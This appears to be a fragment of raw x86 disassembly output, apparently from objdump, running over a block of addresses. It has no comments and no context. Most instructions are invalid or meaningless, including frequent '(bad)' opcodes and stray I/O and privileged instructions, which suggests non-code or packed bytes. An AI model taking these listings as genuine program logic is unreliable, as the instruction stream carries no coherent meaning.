  40abe7:	xchg   edi,eax
  40abe8:	sub    BYTE PTR [esi+eax*2-0x53],ah
  40abec:	xchg   ebx,eax
  40abed:	icebp  
  40abee:	(bad)  
  40abef:	xor    ah,dl
  40abf1:	cld    
  40abf2:	xor    eax,0x85bc9de1
  40abf7:	(bad)  
  40abf9:	dec    ebx
  40abfa:	mov    cl,0x2a
  40abfc:	arpl   WORD PTR [ecx-0x48637300],cx
  40ac02:	jo     0x40abaa
  40ac04:	in     al,0x3f
  40ac06:	(bad)  
  40ac08:	jg     0x40ac5b
  40ac0a:	mov    BYTE PTR [ebx+0x5dc69136],al
  40ac10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac11:	and    ch,BYTE PTR [edi-0x5ce35622]
  40ac17:	sub    eax,0x6ec99415
  40ac1c:	sub    ah,BYTE PTR [ebx+0x76d26ef2]
  40ac22:	sub    dh,BYTE PTR [ebx+0x1b]
  40ac25:	ds jecxz 0x40abc6
  40ac28:	jne    0x40ac48
  40ac2a:	push   eax
  40ac2b:	outs   dx,DWORD PTR ds:[esi]
  40ac2c:	inc    edx
  40ac2d:	and    eax,0xc3e87daf
  40ac32:	shr    eax,cl
  40ac34:	rcl    BYTE PTR [ebx+ebx*8-0x1131b5ba],cl
  40ac3b:	sar    DWORD PTR [ecx-0x4b57d4ef],cl
  40ac41:	icebp  
  40ac42:	push   ds
  40ac43:	mov    dh,0x61
  40ac45:	jb     0x40abcb
  40ac47:	(bad)  
  40ac48:	xchg   ebx,eax
  40ac49:	adc    dh,ah
  40ac4b:	add    ecx,0xffffff8f
  40ac4e:	cmp    BYTE PTR [esi-0x5a9038ec],bl
  40ac54:	xor    dh,BYTE PTR [ecx+0x41]
  40ac57:	iret   
  40ac58:	lods   al,BYTE PTR ds:[esi]
  40ac59:	jmp    0x1b53:0x60e2b284
  40ac60:	leave  
  40ac61:	or     eax,DWORD PTR [esp+ecx*8]
  40ac64:	mov    ebx,ebx
  40ac66:	inc    ebp
  40ac67:	fwait
  40ac68:	dec    edi
  40ac69:	push   esp
  40ac6a:	cmp    ch,BYTE PTR [edi-0x3e5f112e]
  40ac70:	out    0xdc,eax
  40ac72:	into   
  40ac73:	out    dx,al
  40ac74:	rcl    BYTE PTR [eax-0x745ab1ab],cl
  40ac7a:	cmp    DWORD PTR [ebx+ebp*4+0x1e],ebx
  40ac7e:	pushf  
  40ac7f:	out    0x3a,al
  40ac81:	pop    ebp
  40ac82:	cmp    DWORD PTR [edx-0x51a111f7],esp
  40ac88:	iret   
  40ac89:	add    eax,0x398d73f7
  40ac8e:	test   DWORD PTR [ecx],ecx
  40ac90:	daa    
  40ac91:	nop
  40ac92:	dec    ebx
  40ac93:	pop    esp
  40ac94:	jmp    0x5e82b8aa
  40ac99:	mov    ds:0x541ad62e,al
  40ac9e:	test   dh,al
  40aca0:	mov    edi,0x93dd4b60
  40aca5:	outs   dx,DWORD PTR ds:[esi]
  40aca6:	adc    BYTE PTR [esi+0x2962f17a],cl
  40acac:	inc    esi
  40acad:	push   0xfffffffa
  40acaf:	arpl   dx,dx
  40acb1:	push   edx
  40acb2:	icebp  
  40acb3:	cmp    esp,ebp
  40acb5:	mul    BYTE PTR [esi+eiz*2]
  40acb8:	adc    DWORD PTR es:[esi],esi
  40acbb:	and    al,bl
  40acbd:	dec    esp
  40acbe:	mov    edx,0x88a7f5ca
  40acc3:	daa    
  40acc4:	and    DWORD PTR [esp+ecx*1-0x6f5eb033],edx
  40accb:	(bad)  
  40accc:	retf   
  40accd:	mov    dh,0x49
  40accf:	popa   
  40acd0:	nop
  40acd1:	adc    al,0xfb
  40acd3:	std    
  40acd4:	out    0xbb,eax
  40acd6:	add    eax,0x134e8a3f
  40acdb:	mov    edx,0x5d4dc3d0
  40ace0:	int3   
  40ace1:	rcr    DWORD PTR [esi-0x10],1
  40ace4:	dec    BYTE PTR [ebp+0x76]
  40ace7:	push   es
  40ace8:	inc    ebx
  40ace9:	jmp    0x40ad46
  40aceb:	mov    gs,WORD PTR ds:0x8b4c3b2d
  40acf1:	lahf   
  40acf2:	sub    al,0x23
  40acf4:	mov    dh,0x6b
  40acf6:	test   dl,bl
  40acf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acf9:	daa    
  40acfa:	ror    BYTE PTR [ebp-0x72acffae],cl
  40ad00:	xor    BYTE PTR [edx],bl
  40ad02:	(bad)  
  40ad03:	fwait
  40ad04:	js     0x40ad1e
  40ad06:	or     eax,0x85d26dfa
  40ad0b:	pop    esp
  40ad0c:	das    
  40ad0d:	leave  
  40ad0e:	cmc    
  40ad0f:	cs and al,0x8d
  40ad12:	push   esp
  40ad13:	mov    ?,WORD PTR [edx+0x2a6fff0b]
  40ad19:	pusha  
  40ad1a:	push   0xc8ead2ca
  40ad1f:	mov    eax,0x214df284
  40ad24:	push   cs
  40ad25:	adc    DWORD PTR [ecx],esp
  40ad27:	icebp  
  40ad28:	fst    QWORD PTR [ebp+0x5c]
  40ad2b:	lahf   
  40ad2c:	push   ds
  40ad2d:	and    edi,edi
  40ad2f:	iret   
  40ad30:	retf   0xce41
  40ad33:	int    0xf2
  40ad35:	xchg   ebx,eax
  40ad36:	int3   
  40ad37:	xchg   DWORD PTR [edx-0x44567063],esp
  40ad3d:	mov    eax,DWORD PTR [esp+edi*1-0x74e59340]
  40ad44:	shr    BYTE PTR [ebx-0x80],cl
  40ad47:	cmp    DWORD PTR [ebx],esi
  40ad49:	rol    DWORD PTR [ebp+0x1dfff76],cl
  40ad4f:	jae    0x40ad55
  40ad51:	pop    ds
  40ad52:	pop    ecx
  40ad53:	mov    ds,WORD PTR [eax-0x76]
  40ad56:	clc    
  40ad57:	rol    DWORD PTR [edi],0x6f
  40ad5a:	imul   eax,DWORD PTR [esp+esi*4],0x30385b1
  40ad61:	pop    edi
  40ad62:	adc    DWORD PTR [edx],esp
  40ad64:	ss xchg edx,eax
  40ad66:	fsubr  st(6),st
  40ad68:	adc    BYTE PTR [ecx],0xbd
  40ad6b:	pushf  
  40ad6c:	inc    ebx
  40ad6d:	jmp    0x40ad19
  40ad6f:	test   BYTE PTR [ebx+ebx*2-0x7c],ah
  40ad73:	aaa    
  40ad74:	loopne 0x40ad2b
  40ad76:	mov    ds:0x96a50519,al
  40ad7b:	mov    es,WORD PTR [ecx+0x37097217]
  40ad81:	or     al,BYTE PTR [eax+0x3975ac9e]
  40ad87:	mov    esi,0xcef2ac58
  40ad8c:	jns    0x40ad75
  40ad8e:	test   al,0x92
  40ad90:	in     al,0x68
  40ad92:	mov    eax,0xc6651e5a
  40ad97:	mov    fs,WORD PTR [edi+0x7e8b48e1]
  40ad9d:	sub    DWORD PTR [edi-0x24],ecx
  40ada0:	push   ebp
  40ada1:	and    ebx,DWORD PTR ds:0xeacc5293
  40ada7:	cmp    DWORD PTR [esi+ecx*2-0x72d4b61],edi
  40adae:	test   dh,ah
  40adb0:	mov    al,ds:0x8b432d20
  40adb5:	adc    eax,ecx
  40adb7:	sub    eax,0xa85e1c71
  40adbc:	inc    esi
  40adbd:	push   esi
  40adbe:	dec    eax
  40adbf:	push   eax
  40adc0:	mov    DWORD PTR [esi],0x10e61e68
  40adc6:	cmp    DWORD PTR [esi+edi*2+0x74ee56db],ecx
  40adcd:	cmp    ecx,DWORD PTR [edx]
  40adcf:	mov    es,WORD PTR [eax+0x36]
  40add2:	pop    eax
  40add3:	cli    
  40add4:	pushf  
  40add5:	inc    esp
  40add6:	repz pushf 
  40add8:	rcl    cl,cl
  40adda:	ret    0x7951
  40addd:	pushf  
  40adde:	leave  
  40addf:	jmp    0x40adaf
  40ade1:	adc    DWORD PTR ds:0xe783b318,ecx
  40ade7:	pop    ecx
  40ade8:	fnsave [edi]
  40adea:	cld    
  40adeb:	lods   al,BYTE PTR ds:[esi]
  40adec:	xchg   esp,eax
  40aded:	inc    eax
  40adee:	pop    edi
  40adef:	stos   BYTE PTR es:[edi],al
  40adf0:	rcl    ah,cl
  40adf2:	int    0xcc
  40adf4:	push   esp
  40adf5:	fild   WORD PTR [ecx-0x57]
  40adf8:	xchg   DWORD PTR [eax+0x1552c493],edx
  40adfe:	sbb    eax,edx
  40ae00:	and    BYTE PTR [eax-0x735267e0],0xf4
  40ae07:	ins    BYTE PTR es:[edi],dx
  40ae08:	mov    bh,0x88
  40ae0a:	out    0x1f,al
  40ae0c:	pusha  
  40ae0d:	push   esp
  40ae0e:	and    cl,dh
  40ae10:	jae    0x40ad9c
  40ae12:	jnp    0x40ae59
  40ae14:	inc    esp
  40ae15:	push   ds
  40ae16:	xor    eax,0x7aeddec0
  40ae1b:	(bad)  
  40ae1c:	in     eax,dx
  40ae1d:	cli    
  40ae1e:	test   DWORD PTR [eax],ecx
  40ae20:	dec    eax
  40ae21:	stos   BYTE PTR es:[edi],al
  40ae22:	dec    ebp
  40ae23:	mov    ebx,0x9f6ee3ec
  40ae28:	xchg   ebx,eax
  40ae29:	imul   esi,esi,0xdec5f22d
  40ae2f:	aam    0x6f
  40ae31:	inc    ebx
  40ae32:	test   BYTE PTR [edx],ah
  40ae34:	(bad)  
  40ae35:	in     eax,dx
  40ae36:	or     bl,ah
  40ae38:	sub    DWORD PTR [edx],ecx
  40ae3a:	loop   0x40adc9
  40ae3c:	jmp    0x40ae72
  40ae3e:	fcom   st(7)
  40ae40:	xchg   edx,eax
  40ae41:	mov    bh,0x7e
  40ae43:	out    0x23,al
  40ae45:	cmp    bh,0x3a
  40ae48:	loop   0x40ae74
  40ae4a:	and    DWORD PTR [ebx-0x415e07ca],edx
  40ae50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae51:	jns    0x40ae91
  40ae53:	lea    edx,[ebp-0x20f104af]
  40ae59:	xchg   edi,eax
  40ae5a:	ret    0x2be5
  40ae5d:	loopne 0x40ade4
  40ae5f:	xchg   BYTE PTR [edx-0x69530b62],cl
  40ae65:	test   bl,ah
  40ae67:	cwde   
  40ae68:	(bad)  
  40ae69:	std    
  40ae6a:	sbb    al,0x38
  40ae6c:	and    ecx,edx
  40ae6e:	lock mov edi,0xd14dc0d1
  40ae74:	(bad)  
  40ae75:	jl     0x40aed0
  40ae77:	in     eax,dx
  40ae78:	xchg   cl,cl
  40ae7a:	test   DWORD PTR [ecx-0x6a],ebp
  40ae7d:	hlt    
  40ae7e:	adc    BYTE PTR [ecx-0x71761f66],0xc0
  40ae85:	pushf  
  40ae86:	das    
  40ae87:	add    ah,al
  40ae89:	lahf   
  40ae8a:	mov    es,WORD PTR [eax-0x78766974]
  40ae90:	and    bl,BYTE PTR [ebx*4+0x25f955fb]
  40ae97:	mov    bh,0x74
  40ae99:	inc    ebx
  40ae9a:	push   cs
  40ae9b:	mov    cs,edi
  40ae9d:	(bad)  
  40ae9e:	jmp    0x40ae45
  40aea0:	sbb    DWORD PTR [ecx+0x3bb23e45],ebp
  40aea6:	mov    BYTE PTR [esi+eax*2-0x17],dh
  40aeaa:	das    
  40aeab:	out    0x38,al
  40aead:	nop
  40aeae:	add    ch,ch
  40aeb0:	iret   
  40aeb1:	cmp    ch,al
  40aeb3:	adc    DWORD PTR [ebp-0x6b],edi
  40aeb6:	jle    0x908fab41
  40aebc:	jo     0x40af2c
  40aebe:	adc    eax,0x8a323dad
  40aec3:	xchg   esp,eax
  40aec4:	les    ebp,FWORD PTR [eax+0x18]
  40aec7:	mov    ecx,DWORD PTR [edx+0x55]
  40aeca:	mov    esi,0xecab55ee
  40aecf:	lahf   
  40aed0:	jp     0x40ae6e
  40aed2:	loopne 0x40aecf
  40aed4:	xchg   edx,eax
  40aed5:	sub    dh,BYTE PTR [edx-0x7ad851c5]
  40aedb:	(bad)  
  40aedc:	ja     0x40aeab
  40aede:	pop    ebp
  40aedf:	(bad)  
  40aee0:	xchg   ecx,eax
  40aee1:	mov    ecx,DWORD PTR [eax]
  40aee3:	mov    ss,WORD PTR [ebx-0x7f]
  40aee6:	cmp    BYTE PTR [eax-0x7e],cl
  40aee9:	lods   al,BYTE PTR ds:[esi]
  40aeea:	arpl   WORD PTR [edi+0x51fe5788],si
  40aef0:	les    ecx,FWORD PTR [ebp-0xf2e11a6]
  40aef6:	pop    edi
  40aef7:	xor    BYTE PTR [ebx+0x7a],ah
  40aefa:	test   ebx,esi
  40aefc:	mov    dh,0xe2
  40aefe:	jb     0x40aee8
  40af00:	add    edx,DWORD PTR [ecx]
  40af02:	cmp    eax,0xbbab003d
  40af07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af08:	jno    0x40af40
  40af0a:	and    BYTE PTR [ebx-0x9],0xc
  40af0e:	mov    dl,BYTE PTR [edx+0x6445ef1]
  40af14:	add    esp,ebx
  40af16:	retf   
  40af17:	mov    al,BYTE PTR [ebx-0x1b319d4b]
  40af1d:	lahf   
  40af1e:	daa    
  40af1f:	arpl   WORD PTR [esi-0x58],bp
  40af22:	test   DWORD PTR [edi-0x1f],ebx
  40af25:	dec    ecx
  40af26:	pop    ss
  40af27:	cwde   
  40af28:	mov    BYTE PTR ds:0x8a418efc,al
  40af2e:	xchg   edi,eax
  40af2f:	js     0x40aefa
  40af31:	pop    esp
  40af32:	pop    ds
  40af33:	test   edx,edx
  40af35:	ror    ecx,0xd4
  40af38:	int    0xb8
  40af3a:	xchg   edx,eax
  40af3b:	cmp    edx,DWORD PTR [ecx+edx*1]
  40af3e:	pop    edx
  40af3f:	pop    esi
  40af40:	stos   DWORD PTR es:[edi],eax
  40af41:	push   ss
  40af42:	mov    ecx,0x844236b0
  40af47:	inc    edi
  40af48:	sub    ch,ah
  40af4a:	jbe    0x40aef2
  40af4c:	jnp    0x40af11
  40af4e:	dec    edx
  40af4f:	xchg   ebx,eax
  40af50:	add    DWORD PTR [ebp+0x2edc6e11],eax
  40af56:	or     eax,0x848662fc
  40af5b:	loope  0x40af78
  40af5d:	dec    edi
  40af5e:	and    al,0xe9
  40af60:	cmp    DWORD PTR [ebx],ebx
  40af62:	aad    0x5d
  40af64:	aam    0x47
  40af66:	jl     0x40aef6
  40af68:	sbb    BYTE PTR [ebp-0x2d5146f6],bh
  40af6e:	mul    BYTE PTR [ecx+0x444ffc23]
  40af74:	rcl    bl,cl
  40af76:	cdq    
  40af77:	mov    esi,0x482f21aa
  40af7c:	rcl    DWORD PTR [ecx],1
  40af7e:	repnz enter 0x6f42,0x3a
  40af83:	or     BYTE PTR [ecx],dh
  40af85:	pop    es
  40af86:	test   eax,eax
  40af88:	and    eax,0x234e0dd8
  40af8d:	out    0x52,eax
  40af8f:	mov    ss,esp
  40af91:	or     eax,0x41d3db77
  40af96:	je     0x40b010
  40af98:	mov    dh,0xc9
  40af9a:	xchg   ebx,eax
  40af9b:	or     bh,BYTE PTR [ecx-0x62]
  40af9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af9f:	mov    DWORD PTR [eax],ebx
  40afa1:	lds    ebp,FWORD PTR [esi-0x35eece2d]
  40afa7:	sub    ebp,edi
  40afa9:	scas   eax,DWORD PTR es:[edi]
  40afaa:	hlt    
  40afab:	ret    0x9d83
  40afae:	test   DWORD PTR [esi+0x3c1d10ca],edi
  40afb4:	pop    esp
  40afb5:	pop    ds
  40afb6:	push   ebx
  40afb7:	xchg   ebx,eax
  40afb8:	push   0xe097e773
  40afbd:	sub    ecx,DWORD PTR [edx-0x51]
  40afc0:	mov    DWORD PTR [ebp-0x53],0x6d06c07c
  40afc7:	sbb    DWORD PTR [edx+0x67],edx
  40afca:	jmp    0x8c8e:0x216839f2
  40afd1:	inc    eax
  40afd2:	mov    ah,0xc4
  40afd4:	xchg   esp,eax
  40afd5:	push   esp
  40afd6:	cli    
  40afd7:	or     esp,esp
  40afd9:	sub    al,0x79
  40afdb:	sub    edi,DWORD PTR [esi+ebx*1+0x5a]
  40afdf:	retf   
  40afe0:	dec    esp
  40afe1:	fcmovnbe st,st(0)
  40afe3:	adc    cl,BYTE PTR [edi*1+0x575cab7]
  40afea:	push   eax
  40afeb:	into   
  40afec:	and    al,0x88
  40afee:	outs   dx,DWORD PTR ds:[esi]
  40afef:	inc    ecx
  40aff0:	imul   esi,edx,0xffffff92
  40aff3:	and    edx,DWORD PTR ds:0x59f2801e
  40aff9:	push   ecx
  40affa:	lds    esp,FWORD PTR [esi]
  40affc:	adc    cl,BYTE PTR [eax]
  40affe:	mov    edi,fs
  40b000:	stc    
  40b001:	adc    ebp,eax
  40b003:	nop
  40b004:	lahf   
  40b005:	rcl    BYTE PTR [eax-0x6b],cl
  40b008:	push   edi
  40b009:	ret    0xb685
  40b00c:	sub    bl,BYTE PTR [edx+0x11695dd1]
  40b012:	and    cl,BYTE PTR [esi-0x50dc7cd0]
  40b018:	or     edi,edx
  40b01a:	xchg   BYTE PTR [ecx+0x14eccfd2],dh
  40b020:	(bad)  
  40b021:	arpl   WORD PTR [esi],dx
  40b023:	xchg   edi,eax
  40b024:	xchg   DWORD PTR [ecx],edx
  40b026:	push   cs
  40b027:	sar    BYTE PTR es:[ebp+0x29],0x71
  40b02c:	retf   
  40b02d:	loop   0x40b068
  40b02f:	call   0xd580c1f3
  40b034:	leave  
  40b035:	div    BYTE PTR [ecx+0x5207d073]
  40b03b:	pop    esp
  40b03c:	and    eax,0xe5b2711
  40b041:	add    DWORD PTR es:[eax-0x2e],esi
  40b045:	and    al,0xb3
  40b047:	aaa    
  40b048:	daa    
  40b049:	leave  
  40b04a:	test   DWORD PTR [ecx],0x73aa1132
  40b050:	fadd   QWORD PTR [edi-0x34]
  40b053:	pop    esp
  40b054:	ins    DWORD PTR es:[edi],dx
  40b055:	or     BYTE PTR [ebx+esi*8+0x1ea289da],al
  40b05c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b05d:	cmp    al,dl
  40b05f:	out    dx,al
  40b060:	out    0x11,al
  40b062:	(bad)  
  40b063:	xchg   esp,eax
  40b064:	(bad)
  40b067:	and    DWORD PTR [ecx],esi
  40b069:	mov    WORD PTR [ebp-0x418eeae9],es
  40b06f:	mov    WORD PTR [edi],?
  40b071:	jmp    0x3fb53f11
  40b076:	inc    ebp
  40b077:	push   ds
  40b078:	pop    edi
  40b079:	mov    edx,ds
  40b07b:	jae    0x40b033
  40b07d:	lods   al,BYTE PTR ds:[esi]
  40b07e:	test   DWORD PTR [edx],eax
  40b080:	pop    ss
  40b081:	mov    edi,DWORD PTR [ebx+0x3c]
  40b084:	popf   
  40b085:	scas   eax,DWORD PTR es:[edi]
  40b086:	mov    edi,0x7dc6c38e
  40b08b:	mov    ch,0x56
  40b08d:	cmp    BYTE PTR es:[eax-0x2f],ah
  40b091:	and    ebx,edi
  40b093:	fs (bad) 
  40b095:	ror    DWORD PTR [ecx+ebp*1],1
  40b098:	push   ebp
  40b099:	call   0x4f6f3e7f
  40b09e:	cmp    BYTE PTR [ecx-0x7],0x61
  40b0a2:	popf   
  40b0a3:	frstor [esi-0x2dcc1883]
  40b0a9:	test   eax,0xb8c34d6f
  40b0ae:	out    dx,al
  40b0af:	mov    ds:0xb522548,eax
  40b0b4:	push   edx
  40b0b5:	xchg   BYTE PTR [esi-0x75be4bda],bh
  40b0bb:	popf   
  40b0bc:	shr    BYTE PTR [ebx-0x29ecae4e],cl
  40b0c2:	mov    eax,0x1e43b6
  40b0c7:	xor    dh,dl
  40b0c9:	jge    0x40b0d6
  40b0cb:	out    0x8a,al
  40b0cd:	add    BYTE PTR [ebp-0x258d757],al
  40b0d3:	add    BYTE PTR [eax-0x3a],0xe9
  40b0d7:	nop
  40b0d8:	mov    ah,0xf9
  40b0da:	jne    0x40b0ac
  40b0dc:	outs   dx,BYTE PTR ds:[esi]
  40b0dd:	dec    esi
  40b0de:	test   dh,dl
  40b0e0:	(bad)  
  40b0e1:	test   DWORD PTR [ecx-0x52],edi
  40b0e4:	jbe    0x40b0a6
  40b0e6:	mov    bl,0x97
  40b0e8:	inc    ebp
  40b0e9:	test   ch,bl
  40b0eb:	jae    0x40b0ba
  40b0ed:	jno    0x40b145
  40b0ef:	dec    esi
  40b0f0:	scas   al,BYTE PTR es:[edi]
  40b0f1:	les    eax,FWORD PTR [ebp+0x6231136b]
  40b0f7:	mov    ebx,ss
  40b0f9:	add    cl,bh
  40b0fb:	mov    ss,WORD PTR [esi]
  40b0fd:	dec    ebx
  40b0fe:	adc    esi,ebp
  40b100:	or     ch,BYTE PTR [edi+0x47d20510]
  40b106:	fwait
  40b107:	cs push ds
  40b109:	std    
  40b10a:	adc    eax,0xeb11c94e
  40b10f:	or     al,0x76
  40b111:	pushf  
  40b112:	(bad)  
  40b113:	(bad)  
  40b114:	ss pop edx
  40b116:	xchg   esi,edi
  40b118:	push   ecx
  40b119:	pop    eax
  40b11a:	xchg   dl,ah
  40b11c:	in     eax,0x1e
  40b11e:	mov    ebx,0xb1b59f31
  40b123:	jb     0x40b19f
  40b125:	push   ds
  40b126:	in     eax,0x3d
  40b128:	inc    ebp
  40b129:	retf   
  40b12a:	pushf  
  40b12b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b12c:	std    
  40b12d:	mov    eax,DWORD PTR [ebp-0x18fad928]
  40b133:	dec    ecx
  40b134:	test   al,0xfd
  40b136:	sub    ah,ah
  40b138:	ficom  DWORD PTR [ecx]
  40b13a:	push   ds
  40b13b:	repz arpl WORD PTR [esi-0x75d39ad4],cx
  40b142:	test   DWORD PTR [esi+0x2c59920b],ebp
  40b148:	xchg   DWORD PTR [ebx+0x1b],esp
  40b14b:	mov    ds,WORD PTR [eax]
  40b14d:	or     ebx,ebp
  40b14f:	cmp    BYTE PTR [ebx+ecx*4-0x43],bl
  40b153:	or     al,0xd2
  40b155:	cdq    
  40b156:	cmp    BYTE PTR [edx+ebp*1-0x24],ah
  40b15a:	loopne 0x40b113
  40b15c:	outs   dx,DWORD PTR ds:[esi]
  40b15d:	pop    ds
  40b15e:	lahf   
  40b15f:	push   0xaf4f47ed
  40b164:	scas   al,BYTE PTR es:[edi]
  40b165:	imul   ebp,DWORD PTR [ebx+0x147ad2a0],0x9c280cf0
  40b16f:	cmp    BYTE PTR [edx],bh
  40b171:	sub    BYTE PTR [ebx],al
  40b173:	xor    BYTE PTR [ecx],cl
  40b175:	fadd   DWORD PTR ds:0x3ee2a55a
  40b17b:	in     al,0xc0
  40b17d:	push   ebx
  40b17e:	xchg   esi,eax
  40b17f:	popf   
  40b180:	adc    al,BYTE PTR [ebx+0x6f]
  40b183:	push   DWORD PTR [esi-0x5f7117ed]
  40b189:	xchg   BYTE PTR [ebp+edi*4-0x476cdb9d],dh
  40b190:	rcr    BYTE PTR [edx-0x5],cl
  40b193:	add    DWORD PTR [edi-0x50],esp
  40b196:	jp     0x40b1ec
  40b198:	rcl    BYTE PTR [ecx],1
  40b19a:	in     eax,dx
  40b19b:	out    dx,al
  40b19c:	leave  
  40b19d:	xor    DWORD PTR [ecx],edi
  40b19f:	add    DWORD PTR [edi-0x53582f12],eax
  40b1a5:	lds    ebp,FWORD PTR [ebx+edi*4]
  40b1a8:	fcmovbe st,st(4)
  40b1aa:	dec    edx
  40b1ab:	loopne 0x40b16d
  40b1ad:	daa    
  40b1ae:	add    eax,0x436c589b
  40b1b3:	gs cwde 
  40b1b5:	leave  
  40b1b6:	test   DWORD PTR [edx+ecx*1],ecx
  40b1b9:	or     BYTE PTR [esi],ch
  40b1bb:	jb     0x40b1db
  40b1bd:	or     ebx,ebx
  40b1bf:	mov    ds,WORD PTR [ebx+0xcee2cb0]
  40b1c5:	retf   0xd488
  40b1c8:	mov    ds:0x7d85f812,al
  40b1cd:	jnp    0x40b153
  40b1cf:	rcl    BYTE PTR [edx+ebp*1],1
  40b1d2:	mov    bh,0x74
  40b1d4:	inc    ecx
  40b1d5:	pop    ds
  40b1d6:	xlat   BYTE PTR ds:[ebx]
  40b1d7:	push   ds
  40b1d8:	jae    0x40b15d
  40b1da:	int    0xa7
  40b1dc:	xchg   DWORD PTR [ecx-0x4b],edx
  40b1df:	rcl    dl,cl
  40b1e1:	aam    0x1e
  40b1e3:	dec    ecx
  40b1e4:	sub    al,0xdc
  40b1e6:	jl     0x40b20a
  40b1e8:	jmp    0x994:0xfbaa6905
  40b1ef:	out    0xf2,eax
  40b1f1:	mov    eax,0x14fa7af7
  40b1f6:	test   ebx,edi
  40b1f8:	outs   dx,BYTE PTR ds:[esi]
  40b1f9:	iret   
  40b1fa:	push   es
  40b1fb:	mov    esi,0x6071f9e8
  40b200:	(bad)  
  40b202:	sbb    cl,BYTE PTR [esi-0x2e4aa07]
  40b208:	mov    ch,0x7f
  40b20a:	sbb    al,BYTE PTR [ecx-0x2e]
  40b20d:	fistp  DWORD PTR [eax-0x7e9e8eb9]
  40b213:	mov    esi,0x8e94ea64
  40b218:	cwde   
  40b219:	sbb    esp,edx
  40b21b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b21c:	out    0xe1,eax
  40b21e:	fmulp  st(3),st
  40b220:	rcl    BYTE PTR [ebp+0x65],0xbd
  40b224:	adc    bl,bh
  40b226:	inc    eax
  40b227:	and    BYTE PTR ds:0xdc8ef4f5,dh
  40b22d:	mov    ah,0x92
  40b22f:	push   esi
  40b230:	loopne 0x40b1b3
  40b232:	inc    edx
  40b233:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b234:	ror    BYTE PTR [ecx-0x76],cl
  40b237:	inc    ecx
  40b238:	in     al,0xd1
  40b23a:	xor    BYTE PTR [edi+edi*8+0x11],ch
  40b23e:	mov    ebx,cs
  40b240:	(bad)  
  40b241:	sub    al,0x22
  40b243:	cdq    
  40b244:	adc    BYTE PTR [ebx],bl
  40b246:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b247:	and    eax,0x1c81d332
  40b24c:	int    0x3e
  40b24e:	add    eax,0xacd283cc
  40b253:	mov    fs,WORD PTR [ecx+edx*4-0x68]
  40b257:	sbb    cl,dh
  40b259:	div    DWORD PTR [ebp+0x71]
  40b25c:	shr    BYTE PTR [eax],cl
  40b25e:	jecxz  0x40b249
  40b260:	mov    bl,0xaf
  40b262:	retf   0x1f15
  40b265:	push   ds
  40b266:	popa   
  40b267:	mov    ds:0x10040ff9,eax
  40b26d:	imul   esi,DWORD PTR [esi],0x474cd2ef
  40b273:	pushf  
  40b274:	fstp   DWORD PTR [ecx+0x1e6f23c7]
  40b27a:	les    ebp,FWORD PTR [edx+0x2666d77c]
  40b280:	ins    BYTE PTR es:[edi],dx
  40b281:	mov    dl,0xcc
  40b283:	jae    0x40b257
  40b285:	std    
  40b286:	loopne 0x40b24a
  40b288:	scas   al,BYTE PTR es:[edi]
  40b289:	mov    dh,0x3f
  40b28b:	retf   0x1d44
  40b28e:	and    eax,0xcd8fffa
  40b293:	or     eax,0xf6fe30f1
  40b298:	inc    ebx
  40b299:	jnp    0x40b21f
  40b29b:	(bad)  
  40b29c:	push   0x43
  40b29e:	push   ss
  40b29f:	test   eax,0x8e14324b
  40b2a4:	jg     0x40b228
  40b2a6:	jl     0x40b2ee
  40b2a8:	and    al,0x53
  40b2aa:	xchg   BYTE PTR [eax-0x2e],bl
  40b2ad:	rcl    BYTE PTR [edx-0x16],0x7c
  40b2b1:	je     0x40b2a0
  40b2b3:	fimul  WORD PTR [esi]
  40b2b5:	adc    BYTE PTR [ebx-0x4fb51c0e],dl
  40b2bb:	push   ss
  40b2bc:	rcl    BYTE PTR [ebp+0x73f2dafe],cl
  40b2c2:	aas    
  40b2c3:	sub    BYTE PTR ds:0xef3b7e11,bl
  40b2c9:	stos   DWORD PTR es:[edi],eax
  40b2ca:	mov    ah,0xd6
  40b2cc:	or     al,0x87
  40b2ce:	mov    BYTE PTR [ebp-0x3c],bh
  40b2d1:	adc    eax,0x79d44e5d
  40b2d6:	jne    0x40b332
  40b2d8:	lods   al,BYTE PTR ds:[esi]
  40b2d9:	adc    BYTE PTR [eax],dl
  40b2db:	pop    ecx
  40b2dc:	jp     0x40b2d1
  40b2de:	pop    ss
  40b2df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2e0:	call   0x88ef:0x881e06f3
  40b2e7:	(bad)  
  40b2e8:	mov    cl,0xc8
  40b2ea:	ss cmc 
  40b2ec:	je     0x40b344
  40b2ee:	das    
  40b2ef:	mov    edi,0xc12204b2
  40b2f4:	int3   
  40b2f5:	xchg   ecx,eax
  40b2f6:	fcomp  QWORD PTR [ebp-0x1b]
  40b2f9:	inc    esp
  40b2fa:	aam    0xb6
  40b2fc:	shr    DWORD PTR [ebx],0x26
  40b2ff:	jp     0x40b293
  40b301:	loopne 0x40b2a9
  40b303:	imul   BYTE PTR [eax-0x50]
  40b306:	data16 mov es,WORD PTR [esi-0x79]
  40b30a:	je     0x40b2d1
  40b30c:	ficom  DWORD PTR [ecx+edi*4+0x77e4d276]
  40b313:	xchg   ebp,eax
  40b314:	std    
  40b315:	sbb    cl,BYTE PTR [eax-0x45eeff1d]
  40b31b:	mov    DWORD PTR [ecx+0x7275e2f],edx
  40b321:	push   0xbfccf284
  40b326:	sub    al,0x5
  40b328:	fsub   DWORD PTR [ebx-0x54]
  40b32b:	lea    esp,[ebx+0x436fbede]
  40b331:	jbe    0x40b3b1
  40b333:	xacquire lock xchg BYTE PTR [ebp-0x2c0d28aa],al
  40b33b:	loop   0x40b3a4
  40b33d:	ficomp DWORD PTR [edx+0x25d3478e]
  40b343:	mov    edx,0x522d815
  40b348:	rcr    BYTE PTR [ecx+0x755e91b6],cl
  40b34e:	push   esp
  40b34f:	in     al,0x1e
  40b351:	adc    DWORD PTR [ebx],edi
  40b353:	scas   al,BYTE PTR es:[edi]
  40b354:	ds stc 
  40b356:	pop    ecx
  40b357:	ins    DWORD PTR es:[edi],dx
  40b358:	(bad)  
